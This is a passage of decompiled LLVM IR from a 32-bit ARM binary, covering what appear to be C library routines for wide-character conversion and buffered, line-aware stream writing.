  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_11524 = icmp eq i32 %arg1, 0
  br i1 %v2_11524, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_11520
  br label %bb11

bb:                                               ; preds = %dec_label_pc_11520
  %v3_1152c = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_11554 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_11548 = phi i32 [ %arg1, %.thread ], [ %v3_1152c, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_11540 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1154c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1154c, i32* %stack_var_-16, align 4
  store i32 %v0_11554, i32* %stack_var_-12, align 4
  %v5_1155c = inttoptr i32 %v0_11548 to i8*
  %v6_1155c = call i32 @function_11590(i8* %v5_1155c, i32 %v2_11540, i32 1, i32 16, i32 %arg3)
  %v2_11560 = icmp eq i32 %v6_1155c, 0
  br i1 %v2_11560, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_1156c = phi i32 [ %v6_1155c, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_1156c

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_11570() local_unnamed_addr {
dec_label_pc_11570:
  %v0_1157c = load i32, i32* @r2, align 4
  store i32 %v0_1157c, i32* @r3, align 4
  %v0_11584 = load i32, i32* @r0, align 4
  %v1_11584 = load i32, i32* @r1, align 4
  %v5_11584 = inttoptr i32 %v0_11584 to i8*
  %v6_11584 = call i32 @function_11590(i8* %v5_11584, i32 %v1_11584, i32 -1, i32 %v0_1157c, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_11584
}

define i32 @function_11590(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11590:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11590 = load i32, i32* @r4, align 4
  store i32 %v3_11590, i32* %stack_var_-8, align 4
  %v10_11594 = icmp eq i32 %tmp, %arg2
  br i1 %v10_11594, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11590
  %v0_1159c1 = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_115b0

bb:                                               ; preds = %dec_label_pc_11590
  %v4_11598 = icmp eq i8* %arg1, null
  %v0_1159c = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @ip, align 4
  br i1 %v4_11598, label %dec_label_pc_115b0, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_115ec

dec_label_pc_115b0:                               ; preds = %.thread, %bb
  %v1_115f0.ph = phi i32 [ %v0_1159c, %bb ], [ %v0_1159c1, %.thread ]
  %v2_115a03.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_115b0 = icmp eq i8* %arg1, null
  store i32 %v2_115a03.ph, i32* @ip, align 4
  br i1 %v3_115b0, label %.thread4, label %dec_label_pc_115e4

.thread4:                                         ; preds = %dec_label_pc_115b0
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_115ec

dec_label_pc_115c8:                               ; preds = %dec_label_pc_11604
  %v0_115c8 = call i32 @function_cec4()
  store i32 %v0_115c8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_115d4 = inttoptr i32 %v0_115c8 to i32*
  store i32 84, i32* %v2_115d4, align 4
  %v0_11640.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11640

dec_label_pc_115dc:                               ; preds = %dec_label_pc_11614
  %v3_11618 = zext i8 %v2_11618 to i32
  store i32 %v3_11618, i32* @lr, align 4
  br label %dec_label_pc_11634

dec_label_pc_115e4:                               ; preds = %dec_label_pc_115b0
  store i32 %v2_115a03.ph, i32* @ip, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_115ec

dec_label_pc_115ec:                               ; preds = %bb27, %.thread4, %dec_label_pc_115e4
  %v1_115f020 = phi i32 [ %v0_1159c, %bb27 ], [ %v1_115f0.ph, %.thread4 ], [ %v1_115f0.ph, %dec_label_pc_115e4 ]
  %v2_1161414 = phi i32 [ %tmp, %bb27 ], [ %v2_115a03.ph, %.thread4 ], [ %v2_115a03.ph, %dec_label_pc_115e4 ]
  %v1_115ec = load i32, i32* @r3, align 4
  %v3_115ec = icmp uge i32 %v1_115f020, %v1_115ec
  %v1_115ec.v1_115f020 = select i1 %v3_115ec, i32 %v1_115ec, i32 %v1_115f020
  store i32 %v1_115ec.v1_115f020, i32* %r4.global-to-local, align 4
  %v1_115f8 = inttoptr i32 %arg2 to i32*
  %v2_115f8 = load i32, i32* %v1_115f8, align 4
  store i32 %v2_115f8, i32* @lr, align 4
  store i32 %v1_115ec.v1_115f020, i32* %r0.global-to-local, align 4
  %v2_1162c8 = icmp eq i32 %v1_115ec.v1_115f020, 0
  br i1 %v2_1162c8, label %dec_label_pc_11634, label %dec_label_pc_11604

dec_label_pc_11604:                               ; preds = %dec_label_pc_115ec, %dec_label_pc_11624.dec_label_pc_11604_crit_edge
  %v2_11614 = phi i32 [ %v2_11624, %dec_label_pc_11624.dec_label_pc_11604_crit_edge ], [ %v2_1161414, %dec_label_pc_115ec ]
  %v0_1160c = phi i32 [ %v0_11604.pre, %dec_label_pc_11624.dec_label_pc_11604_crit_edge ], [ %v2_115f8, %dec_label_pc_115ec ]
  %v1_11604 = inttoptr i32 %v0_1160c to i32*
  %v2_11604 = load i32, i32* %v1_11604, align 4
  %v1_1160c = add i32 %v0_1160c, 4
  store i32 %v1_1160c, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_11604, 127
  br i1 %tmp36, label %dec_label_pc_115c8, label %dec_label_pc_11614

dec_label_pc_11614:                               ; preds = %dec_label_pc_11604
  %v1_11614 = trunc i32 %v2_11604 to i8
  %v3_11614 = inttoptr i32 %v2_11614 to i8*
  store i8 %v1_11614, i8* %v3_11614, align 1
  %v0_11618 = load i32, i32* @ip, align 4
  %v1_11618 = inttoptr i32 %v0_11618 to i8*
  %v2_11618 = load i8, i8* %v1_11618, align 1
  %v2_1161c = icmp eq i8 %v2_11618, 0
  br i1 %v2_1161c, label %dec_label_pc_115dc, label %dec_label_pc_11624

dec_label_pc_11624:                               ; preds = %dec_label_pc_11614
  %v1_11624 = load i32, i32* %r2.global-to-local, align 4
  %v2_11624 = add i32 %v1_11624, %v0_11618
  store i32 %v2_11624, i32* @ip, align 4
  %v0_11628 = load i32, i32* %r0.global-to-local, align 4
  %v1_11628 = add i32 %v0_11628, -1
  store i32 %v1_11628, i32* %r0.global-to-local, align 4
  %v2_1162c = icmp eq i32 %v1_11628, 0
  br i1 %v2_1162c, label %dec_label_pc_11634, label %dec_label_pc_11624.dec_label_pc_11604_crit_edge

dec_label_pc_11624.dec_label_pc_11604_crit_edge:  ; preds = %dec_label_pc_11624
  %v0_11604.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_11604

dec_label_pc_11634:                               ; preds = %dec_label_pc_11624, %dec_label_pc_115ec, %dec_label_pc_115dc
  %v0_11634 = phi i32 [ %v0_11618, %dec_label_pc_115dc ], [ %v2_1161414, %dec_label_pc_115ec ], [ %v2_11624, %dec_label_pc_11624 ]
  %v1_11634 = load i32, i32* @sp, align 4
  %v9_11634 = icmp eq i32 %v0_11634, %v1_11634
  br i1 %v9_11634, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_11634
  %v1_11638 = load i32, i32* @lr, align 4
  store i32 %v1_11638, i32* %v1_115f8, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_11634, %bb30
  %v0_1163c = load i32, i32* %r0.global-to-local, align 4
  %v1_1163c = load i32, i32* %r4.global-to-local, align 4
  %v2_1163c = sub i32 %v1_1163c, %v0_1163c
  store i32 %v2_1163c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11640

dec_label_pc_11640:                               ; preds = %dec_label_pc_115c8, %bb31
  %v0_11640 = phi i32 [ %v0_11640.pre, %dec_label_pc_115c8 ], [ %v2_1163c, %bb31 ]
  store i32 %v0_11640, i32* %r0.global-to-local, align 4
  %v2_11648 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11648, i32* %r4.global-to-local, align 4
  ret i32 %v0_11640

; uselistorder directives
  uselistorder i32 %v0_11640, { 1, 0 }
  uselistorder i32 %v1_11628, { 1, 0 }
  uselistorder i32 %v2_11624, { 0, 2, 1 }
  uselistorder i32 %v2_11604, { 1, 0 }
  uselistorder i32 %v2_1161414, { 1, 0 }
  uselistorder i32 %v1_115f0.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* @sp, { 2, 1, 0 }
  uselistorder i32 127, { 0, 3, 1, 2 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11640, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_11604, { 1, 0 }
  uselistorder label %dec_label_pc_115ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_115b0, { 1, 0 }
}

define i32 @function_1164c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1164c:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1164c = load i32, i32* @r4, align 4
  store i32 %v3_1164c, i32* %stack_var_-12, align 4
  %v6_1164c = load i32, i32* @r5, align 4
  %v9_1164c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_1165c = call i32 @function_11158(i32 %arg1, i32 3)
  %v7_11660 = icmp eq i32 %v2_1165c, -1
  br i1 %v7_11660, label %dec_label_pc_1164c.dec_label_pc_1167c_crit_edge, label %dec_label_pc_11674

dec_label_pc_1164c.dec_label_pc_1167c_crit_edge:  ; preds = %dec_label_pc_1164c
  br label %dec_label_pc_1167c

dec_label_pc_11674:                               ; preds = %dec_label_pc_1164c
  %v0_11668 = load i32, i32* @r4, align 4
  %v0_11664 = load i32, i32* %r5.global-to-local, align 4
  %v2_11674 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11674, i32* @r4, align 4
  store i32 %v6_1164c, i32* @r5, align 4
  store i32 %v9_1164c, i32* @lr, align 4
  %v4_11678 = inttoptr i32 %v0_11664 to i8*
  %v5_11678 = call i32 @function_d498(i32 %v2_1165c, i8* %v4_11678, i32 0, i32 %v0_11668)
  br label %dec_label_pc_1167c

dec_label_pc_1167c:                               ; preds = %dec_label_pc_1164c.dec_label_pc_1167c_crit_edge, %dec_label_pc_11674
  %v2_11680 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11680, i32* @r4, align 4
  store i32 %v6_1164c, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1165c, { 1, 0 }
  uselistorder i32 %v6_1164c, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_11158, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1167c, { 1, 0 }
}

define i32 @function_11684(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11684:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_116982 = icmp eq i32 %arg3, 0
  store i1 %v2_116982, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_116982, label %dec_label_pc_11738, label %dec_label_pc_116a4

dec_label_pc_11698thread-pre-split:               ; preds = %bb22
  %v3_116bc = load i32, i32* %r7.global-to-local, align 4
  %v5_116bc = add i32 %v3_116bc, %v4_116b0
  store i32 %v5_116bc, i32* %r7.global-to-local, align 4
  %v5_116c0 = sub i32 %v0_116b8, %v4_116b0
  store i32 %v5_116c0, i32* %r5.global-to-local, align 4
  %v2_11698 = icmp eq i32 %v5_116c0, 0
  store i1 %v2_11698, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_116c0, i32* @r2, align 4
  br i1 %v2_11698, label %dec_label_pc_11698.dec_label_pc_11738.loopexit_crit_edge, label %dec_label_pc_116a4

dec_label_pc_116a4:                               ; preds = %dec_label_pc_11684, %dec_label_pc_11698thread-pre-split
  %v0_116a8 = phi i32 [ %v5_116bc, %dec_label_pc_11698thread-pre-split ], [ %arg2, %dec_label_pc_11684 ]
  %v0_116a4.in = phi i32 [ %v5_116c0, %dec_label_pc_11698thread-pre-split ], [ %arg3, %dec_label_pc_11684 ]
  %v0_116a4 = icmp slt i32 %v0_116a4.in, 0
  br i1 %v0_116a4, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_116a4
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_116a4, %bb
  %v0_116ac = load i32, i32* @r4, align 4
  %v1_116ac = add i32 %v0_116ac, 4
  %v2_116ac = inttoptr i32 %v1_116ac to i32*
  %v3_116ac = load i32, i32* %v2_116ac, align 4
  store i32 %v3_116ac, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_116a8 to i32*
  %v4_116b0 = call i32 @function_ce64(i32 %v3_116ac, i32* %tmp23)
  store i32 %v4_116b0, i32* %r0.global-to-local, align 4
  %v1_116b4 = icmp slt i32 %v4_116b0, 0
  %v2_116b4 = icmp eq i32 %v4_116b0, 0
  store i1 %v2_116b4, i1* %cpsr_z.global-to-local, align 1
  %v0_116b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_116b8, i32* %r6.global-to-local, align 4
  br i1 %v1_116b4, label %dec_label_pc_116c8, label %dec_label_pc_11698thread-pre-split

dec_label_pc_116c8:                               ; preds = %bb22
  %v0_116c8 = load i32, i32* @r4, align 4
  %v1_116c8 = inttoptr i32 %v0_116c8 to i32*
  %v2_116c8 = load i32, i32* %v1_116c8, align 4
  store i32 %v2_116c8, i32* %r3.global-to-local, align 4
  %v1_116cc = add i32 %v0_116c8, 8
  store i32 %v1_116cc, i32* %r0.global-to-local, align 4
  %v1_116d0 = inttoptr i32 %v1_116cc to i32*
  %v2_116d0 = load i32, i32* %v1_116d0, align 4
  store i32 %v2_116d0, i32* %r0.global-to-local, align 4
  %v3_116d0 = add i32 %v0_116c8, 12
  %v4_116d0 = inttoptr i32 %v3_116d0 to i32*
  %v5_116d0 = load i32, i32* %v4_116d0, align 4
  %v1_116d4 = or i32 %v2_116c8, 8
  store i32 %v1_116d4, i32* %r3.global-to-local, align 4
  %v3_116d8 = sdiv i32 %v2_116c8, 256
  %v2_116dc = sub i32 %v5_116d0, %v2_116d0
  store i32 %v2_116dc, i32* %r2.global-to-local, align 4
  %v9_116dc = icmp eq i32 %v5_116d0, %v2_116d0
  store i1 %v9_116dc, i1* %cpsr_z.global-to-local, align 1
  %v1_116e0 = trunc i32 %v3_116d8 to i8
  %v3_116e0 = add i32 %v0_116c8, 1
  %v4_116e0 = inttoptr i32 %v3_116e0 to i8*
  store i8 %v1_116e0, i8* %v4_116e0, align 1
  %v0_116e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_116e4 = trunc i32 %v0_116e4 to i8
  %v2_116e4 = load i32, i32* @r4, align 4
  %v3_116e4 = inttoptr i32 %v2_116e4 to i8*
  store i8 %v1_116e4, i8* %v3_116e4, align 1
  %v0_116e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_116e8, label %dec_label_pc_116c8.dec_label_pc_11734_crit_edge, label %dec_label_pc_116ec

dec_label_pc_116c8.dec_label_pc_11734_crit_edge:  ; preds = %dec_label_pc_116c8
  %v0_11734.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11734

dec_label_pc_116ec:                               ; preds = %dec_label_pc_116c8
  %v0_116ec = load i32, i32* %r2.global-to-local, align 4
  %v1_116ec = load i32, i32* %r5.global-to-local, align 4
  %v9_116ec = icmp eq i32 %v0_116ec, %v1_116ec
  store i1 %v9_116ec, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_116ec, %v1_116ec
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_116ec
  store i32 %v0_116ec, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_116ec, %bb24
  %v0_116f4.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_116f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_11718
  %v2_116f8 = phi i32 [ %v2_116f8.pre, %.preheader ], [ %v1_1171c, %dec_label_pc_11718 ]
  %v0_116f4 = phi i32 [ %v0_116f4.pre, %.preheader ], [ %v1_11704, %dec_label_pc_11718 ]
  %v1_116f4 = inttoptr i32 %v0_116f4 to i8*
  %v2_116f4 = load i8, i8* %v1_116f4, align 1
  %v3_116f4 = zext i8 %v2_116f4 to i32
  store i32 %v3_116f4, i32* %r3.global-to-local, align 4
  %v3_116f8 = inttoptr i32 %v2_116f8 to i8*
  store i8 %v2_116f4, i8* %v3_116f8, align 1
  %v0_116fc = load i32, i32* %r0.global-to-local, align 4
  %v1_116fc = inttoptr i32 %v0_116fc to i8*
  %v2_116fc = load i8, i8* %v1_116fc, align 1
  %v3_116fc = zext i8 %v2_116fc to i32
  store i32 %v3_116fc, i32* %r3.global-to-local, align 4
  %v7_11700 = icmp eq i8 %v2_116fc, 10
  store i1 %v7_11700, i1* %cpsr_z.global-to-local, align 1
  %v0_11704 = load i32, i32* %r7.global-to-local, align 4
  %v1_11704 = add i32 %v0_11704, 1
  store i32 %v1_11704, i32* %r7.global-to-local, align 4
  br i1 %v7_11700, label %dec_label_pc_1170c, label %dec_label_pc_11718

dec_label_pc_1170c:                               ; preds = %bb25
  %v0_1170c = load i32, i32* @r4, align 4
  %v1_1170c = add i32 %v0_1170c, 1
  %v2_1170c = inttoptr i32 %v1_1170c to i8*
  %v3_1170c = load i8, i8* %v2_1170c, align 1
  %v4_1170c = zext i8 %v3_1170c to i32
  store i32 %v4_1170c, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_1170c, 2
  %v2_11710 = icmp eq i8 %tmp30, 0
  store i1 %v2_11710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11710, label %dec_label_pc_11718, label %dec_label_pc_11724

dec_label_pc_11718:                               ; preds = %dec_label_pc_1170c, %bb25
  %v0_11718 = load i32, i32* %r6.global-to-local, align 4
  %v1_11718 = add i32 %v0_11718, -1
  store i32 %v1_11718, i32* %r6.global-to-local, align 4
  %v7_11718 = icmp eq i32 %v0_11718, 1
  store i1 %v7_11718, i1* %cpsr_z.global-to-local, align 1
  %v1_1171c = add i32 %v0_116fc, 1
  store i32 %v1_1171c, i32* %r0.global-to-local, align 4
  br i1 %v7_11718, label %dec_label_pc_11718.dec_label_pc_11724_crit_edge, label %bb25

dec_label_pc_11718.dec_label_pc_11724_crit_edge:  ; preds = %dec_label_pc_11718
  %v0_11724.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11724

dec_label_pc_11724:                               ; preds = %dec_label_pc_1170c, %dec_label_pc_11718.dec_label_pc_11724_crit_edge
  %v0_11728 = phi i32 [ %v1_1171c, %dec_label_pc_11718.dec_label_pc_11724_crit_edge ], [ %v0_116fc, %dec_label_pc_1170c ]
  %v0_11724 = phi i32 [ %v0_11724.pre, %dec_label_pc_11718.dec_label_pc_11724_crit_edge ], [ %v0_1170c, %dec_label_pc_1170c ]
  %v1_11724 = add i32 %v0_11724, 8
  %v2_11724 = inttoptr i32 %v1_11724 to i32*
  %v3_11724 = load i32, i32* %v2_11724, align 4
  store i32 %v3_11724, i32* %r3.global-to-local, align 4
  %v2_11728 = add i32 %v0_11724, 16
  %v3_11728 = inttoptr i32 %v2_11728 to i32*
  store i32 %v0_11728, i32* %v3_11728, align 4
  %v0_1172c = load i32, i32* %r3.global-to-local, align 4
  %v1_1172c = load i32, i32* %r0.global-to-local, align 4
  %v2_1172c = sub i32 %v1_1172c, %v0_1172c
  store i32 %v2_1172c, i32* %r3.global-to-local, align 4
  %v1_11730 = load i32, i32* %r5.global-to-local, align 4
  %v2_11730 = sub i32 %v1_11730, %v2_1172c
  store i32 %v2_11730, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11734

dec_label_pc_11734:                               ; preds = %dec_label_pc_116c8.dec_label_pc_11734_crit_edge, %dec_label_pc_11724
  %v0_11734 = phi i32 [ %v0_11734.pre, %dec_label_pc_116c8.dec_label_pc_11734_crit_edge ], [ %v2_11730, %dec_label_pc_11724 ]
  %v1_11734 = load i32, i32* %r8.global-to-local, align 4
  %v2_11734 = sub i32 %v1_11734, %v0_11734
  store i32 %v2_11734, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11738

dec_label_pc_11698.dec_label_pc_11738.loopexit_crit_edge: ; preds = %dec_label_pc_11698thread-pre-split
  %v0_11738.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11738

dec_label_pc_11738:                               ; preds = %dec_label_pc_11684, %dec_label_pc_11698.dec_label_pc_11738.loopexit_crit_edge, %dec_label_pc_11734
  %v0_11738 = phi i32 [ %v2_11734, %dec_label_pc_11734 ], [ %v0_11738.pre.pre, %dec_label_pc_11698.dec_label_pc_11738.loopexit_crit_edge ], [ 0, %dec_label_pc_11684 ]
  store i32 %v0_11738, i32* %r0.global-to-local, align 4
  ret i32 %v0_11738

; uselistorder directives
  uselistorder i32 %v0_11738, { 1, 0 }
  uselistorder i32 %v0_11724, { 1, 0 }
  uselistorder i32 %v1_1171c, { 0, 2, 1 }
  uselistorder i32 %v0_11718, { 1, 0 }
  uselistorder i1 %v2_11710, { 1, 0 }
  uselistorder i32 %v1_11704, { 1, 0 }
  uselistorder i32 %v0_116ec, { 1, 0, 2 }
  uselistorder i32 %v5_116d0, { 1, 0 }
  uselistorder i32 %v2_116d0, { 1, 0, 2 }
  uselistorder i32 %v0_116b8, { 1, 0 }
  uselistorder i32 %v4_116b0, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_116c0, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 6, 4, 7, 8, 1, 9, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32*)* @function_ce64, { 1, 0 }
  uselistorder label %dec_label_pc_11738, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11734, { 1, 0 }
  uselistorder label %dec_label_pc_11724, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_116a4, { 1, 0 }
}

define i32 @function_11740(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11740:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11740 = load i32, i32* @r4, align 4
  store i32 %v3_11740, i32* %stack_var_-20, align 4
  %v6_11740 = load i32, i32* @r5, align 4
  %v9_11740 = load i32, i32* @r6, align 4
  %v12_11740 = load i32, i32* @r7, align 4
  %v15_11740 = load i32, i32* @lr, align 4
  %v1_11744 = add i32 %arg3, 1
  %v2_11744 = inttoptr i32 %v1_11744 to i8*
  %v3_11744 = load i8, i8* %v2_11744, align 1
  %v4_11744 = zext i8 %v3_11744 to i32
  %v3_11748 = mul nuw nsw i32 %v4_11744, 256
  %v1_1174c = and i32 %v3_11748, 512
  store i32 %v1_1174c, i32* @r4, align 4
  %v2_1174c = icmp eq i32 %v1_1174c, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1174c, label %dec_label_pc_11760, label %dec_label_pc_1185c

dec_label_pc_11760:                               ; preds = %dec_label_pc_11740
  %v1_11760 = add i32 %arg3, 4
  %v2_11760 = inttoptr i32 %v1_11760 to i32*
  %v3_11760 = load i32, i32* %v2_11760, align 4
  %v1_11768 = add i32 %arg3, 16
  %v2_11768 = inttoptr i32 %v1_11768 to i32*
  %v3_11768 = load i32, i32* %v2_11768, align 4
  store i32 %v3_11768, i32* @r0, align 4
  %v1_1176c = add i32 %arg3, 12
  %v2_1176c = inttoptr i32 %v1_1176c to i32*
  %v3_1176c = load i32, i32* %v2_1176c, align 4
  %v4_11770 = icmp eq i32 %v3_11760, -2
  %v2_11774 = sub i32 %v3_1176c, %v3_11768
  br i1 %v4_11770, label %dec_label_pc_11774, label %dec_label_pc_1179c

dec_label_pc_11774:                               ; preds = %dec_label_pc_11760
  %v3_11778 = icmp ugt i32 %v2_11774, %arg2
  br i1 %v3_11778, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_11774
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_11774, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_11774, %dec_label_pc_11774 ]
  %v0_11780 = phi i32 [ %arg2, %bb ], [ %v2_11774, %dec_label_pc_11774 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_11780, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_11788 = call i32 @function_ef60()
  %v0_1178c = load i32, i32* @r5, align 4
  %v1_1178c = add i32 %v0_1178c, 16
  %v2_1178c = inttoptr i32 %v1_1178c to i32*
  %v3_1178c = load i32, i32* %v2_1178c, align 4
  %v1_11790 = load i32, i32* @r4, align 4
  %v2_11790 = add i32 %v1_11790, %v3_1178c
  store i32 %v2_11790, i32* %v2_1178c, align 4
  br label %dec_label_pc_11870

dec_label_pc_1179c:                               ; preds = %dec_label_pc_11760
  %tmp = icmp ult i32 %v2_11774, %arg2
  br i1 %tmp, label %dec_label_pc_1183c, label %dec_label_pc_117a8

dec_label_pc_117a8:                               ; preds = %dec_label_pc_1179c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_117b0 = call i32 @function_ef60()
  %v0_117b4 = load i32, i32* @r5, align 4
  %v1_117b4 = add i32 %v0_117b4, 16
  %v2_117b4 = inttoptr i32 %v1_117b4 to i32*
  %v3_117b4 = load i32, i32* %v2_117b4, align 4
  %v1_117b8 = add i32 %v0_117b4, 1
  %v2_117b8 = inttoptr i32 %v1_117b8 to i8*
  %v3_117b8 = load i8, i8* %v2_117b8, align 1
  %v1_117bc = load i32, i32* @r6, align 4
  %v2_117bc = add i32 %v1_117bc, %v3_117b4
  %tmp17 = urem i8 %v3_117b8, 2
  %v2_117c0 = icmp eq i8 %tmp17, 0
  store i32 %v2_117bc, i32* %v2_117b4, align 4
  br i1 %v2_117c0, label %dec_label_pc_11870, label %dec_label_pc_117cc

dec_label_pc_117cc:                               ; preds = %dec_label_pc_117a8
  %v0_117cc = load i32, i32* %r7.global-to-local, align 4
  %v0_117d4 = load i32, i32* @r6, align 4
  %v4_117d8 = call i32 @function_12a54(i32 %v0_117cc, i32 10, i32 %v0_117d4, i32 %v2_117bc)
  %v2_117dc = icmp eq i32 %v4_117d8, 0
  br i1 %v2_117dc, label %dec_label_pc_11870, label %dec_label_pc_117e4

dec_label_pc_117e4:                               ; preds = %dec_label_pc_117cc
  %v0_117e4 = load i32, i32* @r5, align 4
  store i32 %v0_117e4, i32* @r0, align 4
  %v0_117e8 = call i32 @function_d8c8()
  %v2_117ec = icmp eq i32 %v0_117e8, 0
  br i1 %v2_117ec, label %dec_label_pc_11870, label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %dec_label_pc_117e4
  %v0_117f4 = load i32, i32* @r6, align 4
  %v3_117f4 = icmp uge i32 %v0_117f4, %v0_117e8
